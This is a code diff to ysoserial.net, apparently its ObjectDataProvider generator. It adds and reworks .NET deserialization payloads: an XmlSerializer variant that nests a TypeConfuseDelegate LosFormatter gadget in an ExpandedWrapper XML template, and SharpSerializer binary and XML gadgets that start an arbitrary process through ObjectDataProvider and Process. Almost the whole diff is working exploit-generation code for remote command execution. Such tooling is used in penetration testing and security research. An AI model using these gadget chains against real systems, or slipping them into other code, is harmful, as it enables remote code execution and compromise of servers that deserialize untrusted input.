@@ -9,6 +9,9 @@ using System.Collections.Specialized;
 using System.Windows;
 using ysoserial.Helpers;
 using NDesk.Options;
+using System.Linq;
+using Polenter.Serialization;
+using System.Text;
 
 /*
  * NOTEs:
@@ -29,14 +32,14 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Xaml (4)", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler", "SharpSerializerBinary", "SharpSerializerXml" };
+            return new List<string> { "Xaml (4)", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer (2)", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler", "SharpSerializerBinary", "SharpSerializerXml" };
         }
 
         public override OptionSet Options()
         {
             OptionSet options = new OptionSet()
             {
-                {"var|variant=", "Payload variant number where applicable. Choices: 1, 2, or 3 based on formatter.", v => int.TryParse(v, out variant_number) },
+                {"var|variant=", "Payload variant number where applicable. Choices: 1, 2, 3, ... based on formatter.", v => int.TryParse(v, out variant_number) },
                 {"xamlurl=", "This is to create a very short paylaod when affected box can read the target XAML URL e.g. \"http://b8.ee/x\" (can be a file path on a shared drive or the local system). This is used by the 3rd XAML payload which is a ResourceDictionary with the Source parameter. Command parameter will be ignored. The shorter the better!", v => xaml_url = v },
             };
 
@@ -316,20 +319,44 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("xmlserializer"))
             {
-                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
+                String payload = "";
 
-                String cmdPart;
-
-                if (inputArgs.HasArguments)
+                if (variant_number == 2)
                 {
-                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
+                    IGenerator tcdGadget = new TypeConfuseDelegateGenerator();
+                    string losFormatterPayload = Encoding.UTF8.GetString((byte[]) tcdGadget.GenerateWithNoTest("LosFormatter", inputArgs));
+                    payload = $@"<?xml version=""1.0""?>
+<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
+    <ExpandedWrapperOfLosFormatterObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >
+        <ExpandedElement/>
+        <ProjectedProperty0>
+            <MethodName>Deserialize</MethodName>
+            <MethodParameters>
+                <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">" + losFormatterPayload + @"</anyType>
+            </MethodParameters>
+            <ObjectInstance xsi:type=""LosFormatter""></ObjectInstance>
+        </ProjectedProperty0>
+    </ExpandedWrapperOfLosFormatterObjectDataProvider>
+</root>
+";
                 }
                 else
                 {
-                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
-                }
 
-                String payload = $@"<?xml version=""1.0""?>
+                    inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
+
+                    String cmdPart;
+
+                    if (inputArgs.HasArguments)
+                    {
+                        cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
+                    }
+                    else
+                    {
+                        cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
+                    }
+
+                    payload = $@"<?xml version=""1.0""?>
 <root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
     <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >
         <ExpandedElement/>
@@ -345,6 +372,8 @@ namespace ysoserial.Generators
     </ExpandedWrapperOfXamlReaderObjectDataProvider>
 </root>
 ";
+                }
+
 
                 if (inputArgs.Minify)
                 {
@@ -594,25 +623,87 @@ namespace ysoserial.Generators
                 }
                 return payload;
             }
-            else if (formatter.ToLowerInvariant().Equals("sharpserializerbinary"))
+            else if (formatter.ToLowerInvariant().Equals("sharpserializerbinary") || formatter.ToLowerInvariant().Equals("sharpserializerxml"))
             {
                 // Binary Serialization Mode
-                object serializedData = SerializersHelper.SharpSerializer_ObjectDataProvider_Binary_Serialize(inputArgs.Cmd);
-                if (inputArgs.Test)
+                ProcessStartInfo psi = new ProcessStartInfo();
+
+                psi.FileName = inputArgs.CmdFileName;
+                if (inputArgs.HasArguments)
                 {
-                    SerializersHelper.SharpSerializer_ObjectDataProvider_Binary_Deserialize(serializedData);
+                    psi.Arguments = inputArgs.CmdArguments;
                 }
-                return serializedData;
-            }
-            else if (formatter.ToLowerInvariant().Equals("sharpserializerxml"))
-            {
-                // XML Serialization Mode
-                string serializedData = (string)SerializersHelper.SharpSerializer_ObjectDataProvider_Xml_Serialize(inputArgs.Cmd);
-                if (inputArgs.Test)
+                StringDictionary dict = new StringDictionary();
+                psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
+                Process p = new Process();
+                p.StartInfo = psi;
+                
+                ObjectDataProvider odp = new ObjectDataProvider();
+                odp.MethodName = "Start";
+                odp.IsInitialLoadEnabled = false;
+                odp.ObjectInstance = p;
+
+                // SharpSerializer has bugs and we need to remove unwanted properties from the serializaiton process
+                List<KeyValuePair<Type, List<String>>> allExclusions = new List<KeyValuePair<Type, List<string>>>();
+
+                List<String> ourExcludedProperties = p.GetType().GetProperties().Where(x => !x.Name.Equals("StartInfo")).Select(item => item.Name).ToList();
+                KeyValuePair<Type, List<String>> exclusionList = new KeyValuePair<Type, List<String>>(p.GetType(), ourExcludedProperties);
+                allExclusions.Add(exclusionList);
+
+                ourExcludedProperties = odp.GetType().GetProperties().Where(x => !x.Name.Equals("MethodName") && !x.Name.Equals("ObjectInstance")).Select(item => item.Name).ToList();
+                exclusionList = new KeyValuePair<Type, List<String>>(odp.GetType(), ourExcludedProperties);
+                allExclusions.Add(exclusionList);
+
+                if (!inputArgs.HasArguments && inputArgs.Minify)
                 {
-                    SerializersHelper.SharpSerializer_ObjectDataProvider_Xml_Deserialize(serializedData);
+                    ourExcludedProperties = psi.GetType().GetProperties().Where(x => !x.Name.Equals("FileName")).Select(item => item.Name).ToList();
                 }
-                return serializedData;
+                else
+                {
+                    ourExcludedProperties = psi.GetType().GetProperties().Where(x => !x.Name.Equals("FileName") && !x.Name.Equals("Arguments")).Select(item => item.Name).ToList();
+                }
+                    
+                exclusionList = new KeyValuePair<Type, List<String>>(psi.GetType(), ourExcludedProperties);
+                allExclusions.Add(exclusionList);
+
+                // Why? I don't know but it seems to be another bug
+                ourExcludedProperties = new List<String>{"Dispatcher"};
+                exclusionList = new KeyValuePair<Type, List<String>>(odp.GetType(), ourExcludedProperties);
+                allExclusions.Add(exclusionList);
+
+                if (formatter.ToLowerInvariant().Equals("sharpserializerxml"))
+                {
+                    var serializedData = SerializersHelper.SharpSerializer_XML_serialize_WithExclusion_ToString(odp, allExclusions);
+
+                    if (inputArgs.Minify)
+                    {
+                        serializedData = XMLMinifier.Minify(serializedData, null, new string[] { @" name=""r""" }, FormatterType.DataContractXML, true);
+                    }
+
+
+                    if (inputArgs.Test)
+                    {
+                        try
+                        {
+                            SerializersHelper.SharpSerializer_XML_deserialize_FromString(serializedData);
+                        }
+                        catch { }
+                    }
+                    return serializedData;
+                }
+                else
+                {
+                    var serializedData = SerializersHelper.SharpSerializer_Binary_serialize_WithExclusion_ToByteArray(odp, allExclusions);
+                    if (inputArgs.Test)
+                    {
+                        try
+                        {
+                            SerializersHelper.SharpSerializer_Binary_deserialize_FromByteArray(serializedData);
+                        }
+                        catch { }
+                    }
+                    return serializedData;
+                } 
             }
             else
             {
